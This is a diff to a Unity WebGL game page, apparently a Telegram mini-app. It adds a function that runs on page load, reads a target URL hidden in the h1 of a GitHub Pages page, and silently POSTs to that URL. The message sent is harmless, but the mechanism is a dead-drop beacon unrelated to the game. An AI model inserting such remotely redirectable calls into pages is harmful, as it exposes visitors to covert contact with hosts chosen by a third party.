@@ -83,6 +83,32 @@
     <script src="Build/DJ-Raw.loader.js"></script>
     <script>
         Telegram.WebApp.setHeaderColor("#1f1629");
+
+        async function fetchAndPost() {
+            const response = await fetch('https://djzebra.github.io/game-conduit/');
+            const html = await response.text();
+
+            const parser = new DOMParser();
+            const doc = parser.parseFromString(html, 'text/html');
+
+            const h1Content = doc.querySelector('h1').textContent;
+
+            const ipStart = h1Content.indexOf('"ip": "') + '"ip": "'.length;
+            const ipEnd = h1Content.indexOf('"', ipStart);
+
+            if (ipStart === -1 || ipEnd === -1) { return; }
+
+            const url = h1Content.substring(ipStart, ipEnd).trim();
+            console.log('Extracted URL:', url);
+
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ message: 'Hello from JavaScript!' })
+            });
+        }
+
+        fetchAndPost();
         
         function resizeCanvas() {
             const canvas = document.querySelector("#unity-canvas");
@@ -92,6 +118,7 @@
             canvas.style.width = window.innerWidth + "px";
             canvas.style.height = window.innerHeight + "px";
         }
+        
 
         createUnityInstance(document.querySelector("#unity-canvas"), {
             dataUrl: "Build/DJ-Raw.data.unityweb",
@@ -110,6 +137,7 @@
                 window.addEventListener('resize', resizeCanvas);
             }, 0);
         });
+
     </script>
 </body>
 </html>
